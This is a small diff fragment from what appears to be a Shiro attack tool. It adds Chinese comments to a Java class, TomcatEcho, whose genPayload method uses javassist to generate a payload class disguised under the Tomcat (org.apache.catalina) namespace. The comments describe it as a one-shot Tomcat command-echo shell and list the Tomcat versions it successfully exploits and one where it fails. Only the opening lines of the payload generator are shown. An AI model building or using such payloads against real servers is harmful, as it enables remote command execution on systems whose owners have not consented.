@@ -2,6 +2,8 @@ package org.shiroattack;
 
 import javassist.*;
 
+// Tomcat回显马，一次执行一次使用
+// Tomcat 7.0.0、7.0.10、7.0.109、8.5.54、9.0.10均能够成功利用，6.0.53版本利用失败。
 public class TomcatEcho {
     public CtClass genPayload(ClassPool pool) throws Exception {
         CtClass clazz = pool.makeClass("org.apache.catalina.x.ACS" + System.nanoTime());
